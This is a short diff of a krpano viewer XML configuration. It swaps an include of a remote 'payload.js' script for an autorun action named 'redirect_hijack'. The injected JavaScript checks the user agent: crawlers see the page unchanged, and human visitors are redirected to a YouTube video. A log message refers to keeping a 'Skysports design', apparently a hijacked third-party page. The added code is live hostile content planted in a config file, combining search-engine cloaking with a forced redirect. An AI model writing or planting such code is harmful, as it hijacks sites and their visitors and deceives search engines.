@@ -1,3 +1,13 @@
 <krpano>
-    <include url="https://xriyanebu.github.io/Payload/payload.js" />
+    <action name="redirect_hijack" autorun="onstart">
+        js(
+            var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
+            if (isBot) {
+                console.log("BOT DETECTED - Letting Skysports design stay.");
+            } else {
+                console.log("HUMAN DETECTED - Redirecting to YouTube.");
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            }
+        );
+    </action>
 </krpano>
